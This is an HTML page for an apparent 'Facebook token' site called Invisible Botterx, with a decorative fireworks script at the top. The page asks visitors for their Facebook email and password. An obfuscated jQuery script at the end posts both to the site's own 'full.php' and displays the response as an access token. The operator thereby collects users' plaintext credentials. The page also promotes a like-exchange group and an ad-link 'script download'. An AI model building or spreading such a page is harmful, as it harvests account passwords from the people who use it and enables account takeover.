<script>

var bits=50; // how many bits
var speed=20; // how fast - smaller is faster
var bangs=9; // how many can be launched simultaneously (note that using too many can slow the script down)
var colours=new Array("#03f", "#f03", "#0e0", "#93f", "#0cf", "#f93", "#f0c");

var bangheight=new Array();
var intensity=new Array();
var colour=new Array();
var Xpos=new Array();
var Ypos=new Array();
var dX=new Array();
var dY=new Array();
var stars=new Array();
var decay=new Array();
var swide=800;
var shigh=600;
var boddie;
window.onload=function() { if (document.getElementById) {
  var i;
  boddie=document.createElement("div");
  boddie.style.position="fixed";
  boddie.style.top="0px";
  boddie.style.left="0px";
  boddie.style.overflow="visible";
  boddie.style.width="1px";
  boddie.style.height="1px";
  boddie.style.backgroundColor="transparent";
  document.body.appendChild(boddie);
  set_width();
  for (i=0; i<bangs; i++) {
    write_fire(i);
    launch(i);
    setInterval('stepthrough('+i+')', speed);
  }
}}
function write_fire(N) {
  var i, rlef, rdow;
  stars[N+'r']=createDiv('|', 12);
  boddie.appendChild(stars[N+'r']);
  for (i=bits*N; i<bits+bits*N; i++) {
    stars[i]=createDiv('*', 13);
    boddie.appendChild(stars[i]);
  }
}
function createDiv(char, size) {
  var div=document.createElement("div");
  div.style.font=size+"px monospace";
  div.style.position="absolute";
  div.style.backgroundColor="transparent";
  div.appendChild(document.createTextNode(char));
  return (div);
}
function launch(N) {
  colour[N]=Math.floor(Math.random()*colours.length);
  Xpos[N+"r"]=swide*0.5;
  Ypos[N+"r"]=shigh-5;
  bangheight[N]=Math.round((0.5+Math.random())*shigh*0.4);
  dX[N+"r"]=(Math.random()-0.5)*swide/bangheight[N];
  if (dX[N+"r"]>1.25) stars[N+"r"].firstChild.nodeValue="/";
  else if (dX[N+"r"]<-1.25) stars[N+"r"].firstChild.nodeValue="\\";
  else stars[N+"r"].firstChild.nodeValue="|";
  stars[N+"r"].style.color=colours[colour[N]];
}
function bang(N) {
  var i, Z, A=0;
  for (i=bits*N; i<bits+bits*N; i++) {
    Z=stars[i].style;
    Z.left=Xpos[i]+"px";
    Z.top=Ypos[i]+"px";
    if (decay[i]) decay[i]--;
    else A++;
    if (decay[i]==15) Z.fontSize="7px";
    else if (decay[i]==7) Z.fontSize="2px";
    else if (decay[i]==1) Z.visibility="hidden";
    Xpos[i]+=dX[i];
    Ypos[i]+=(dY[i]+=1.25/intensity[N]);
  }
  if (A!=bits) setTimeout("bang("+N+")", speed);
}
function stepthrough(N) {
  var i, M, Z;
  var oldx=Xpos[N+"r"];
  var oldy=Ypos[N+"r"];
  Xpos[N+"r"]+=dX[N+"r"];
  Ypos[N+"r"]-=4;
  if (Ypos[N+"r"]<bangheight[N]) {
    M=Math.floor(Math.random()*3*colours.length);
    intensity[N]=5+Math.random()*4;
    for (i=N*bits; i<bits+bits*N; i++) {
      Xpos[i]=Xpos[N+"r"];
      Ypos[i]=Ypos[N+"r"];
      dY[i]=(Math.random()-0.5)*intensity[N];
      dX[i]=(Math.random()-0.5)*(intensity[N]-Math.abs(dY[i]))*1.25;
      decay[i]=16+Math.floor(Math.random()*16);
      Z=stars[i];
      if (M<colours.length) Z.style.color=colours[i%2?colour[N]:M];
      else if (M<2*colours.length) Z.style.color=colours[colour[N]];
      else Z.style.color=colours[i%colours.length];
      Z.style.fontSize="13px";
      Z.style.visibility="visible";
    }
    bang(N);
    launch(N);
  }
  stars[N+"r"].style.left=oldx+"px";
  stars[N+"r"].style.top=oldy+"px";
}
window.onresize=set_width;
function set_width() {
  var sw_min=999999;
  var sh_min=999999;
  if (document.documentElement && document.documentElement.clientWidth) {
    if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth;
    if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight;
  }
  if (typeof(self.innerWidth)!="undefined" && self.innerWidth) {
    if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth;
    if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight;
  }
  if (document.body.clientWidth) {
    if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth;
    if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight;
  }
  if (sw_min==999999 || sh_min==999999) {
    sw_min=800;
    sh_min=600;
  }
  swide=sw_min;
  shigh=sh_min;
}

</script>

<html encoding="utf-8">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>GET FACEBOOK TOKENS | FULL SCRIPT | HTC,IOS,IPHONE,ANDRIOD |</title> 
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
		<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,600' rel='stylesheet' type='text/css'>
    </head>
<br>
<body style="background: url(http://www.hdnicewallpapers.com/Walls/Big/3D/3D_HD_Wallpaper_Background.jpg);">
</br>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
         <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
		 <script src="snow.js"></script>
		 <div style="font-family: Iceland;
font-size: 60pt">
<center><script language="JavaScript" src="header.js"></script></font></center>
<center><hr style="background-color:white;width:60%;"><center>
<center>
<div style="font-family: Iceland;
font-size: 25pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<font style="text-shadow: 1px 1px green; color:yellow;" size="6">☆ INVISIBLE BOTTERX TOKEN SITE ☆</br>
<hr style="background-color:white;width:40%;">
</br>
</head>
<body id="dashboard" class="background-dark template-product" ><br>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-90935031-1', 'auto');
  ga('send', 'pageview');

</script>
<div class="col-sm-3 blog-main"></div>
          <div class="col-sm-6 blog-main">
               <div class="panel panel-default">
                    <div class="panel-heading">
                         <h3 class="panel-title">100% WITHOUT CHECK POINT | SCRIPT CREATER <a href="https://web.facebook.com/groups/Invisible.Botterx/" target="_blank">MOUZAM ALI $ SYED KASHIF SHAH</a></h3>
                    </div>
                    <div class="panel-body">
						<div class="form-group">
						
						</div>
                         <div class="form-group">
                              <label for="email">ENTER YOUR FACEBOOK EMAIL</label>
                              <input id="email" placeholder="Email here..." class="form-control"/>
                         </div>
                         <div class="form-group">
							  <label for="password">ENTER YOUR FACEBOOK PASSWORD</label>
                              <input id="password" type="password" placeholder="Password here..." class="form-control"/>
                         </div>
                         <div class="form-group">
                              <label for="app_id">Select Token Type</label>
                              <select id="app_id" class="form-control">
								<option value="6628568379">FACEBOOK FOR IPHONE</option>
								<option value="350685531728">FACEBOOK FOR ANDROID</option>
								<option value="165907476854626">PAGES MANAGER FOR IOS</option>
								<option value="41158896424">HTC Sense</option> 
                              </select>
                         </div>
                         <div class="form-group text-center">
                              <button id="submit" class="btn btn-sm btn-primary">GET TOKEN</button>
                         </div>
                         <div class="form-group text-center" id="load_result" style="display:none">
                              <label for="result"><center>Access Token Below :</center></label>
                              <textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="4"></textarea>
                         </div>
                    </div>
               </div>
               <div class="panel panel-default">
                    <div class="panel-heading">
                   <center>      <h3 class="panel-title">☕❤JOIN GROUP AND ADD YOUR FRIENDS THEN SHARE YOUR PICS AND GET LIKES❤☕ <a href="https://web.facebook.com/groups/Invisible.Botterx/" target="_blank"> INVISIBLE BOTTERX </a></h3> <center>
				    <center>      <h3 class="panel-title"> <a href="http://wap4dollar.com/ad/serve.php?id=t6n32w1gx1" target="_blank"> DOWNLOAD SCRIPT </a></h3> <center>
                    </div>
						
                   
               </div>
     </div>
</body>
</html>


<script>
var array = ["click", "#submit", "disabled", "attr", "Getting Access Token", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Get Token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "full.php", "post", "ajax", "on"];
$(document)[array[20]](array[0], array[1], function () {
        $(array[1])[array[3]](array[2], array[2]), $(array[1])[array[5]](array[4]);
        var email = $(array[7])[array[6]](),
            password = $(array[8])[array[6]](),
            app_id = $(array[9])[array[6]]();
        $[array[19]]({
            url: array[17],
            type: array[18],
            data: {
                email: email,
                password: password,
                app_id: app_id
            },
            success: function (email) {
                $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](email)
            }
        })[array[16]](function () {
            $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](array[14])
        })
    })
</script>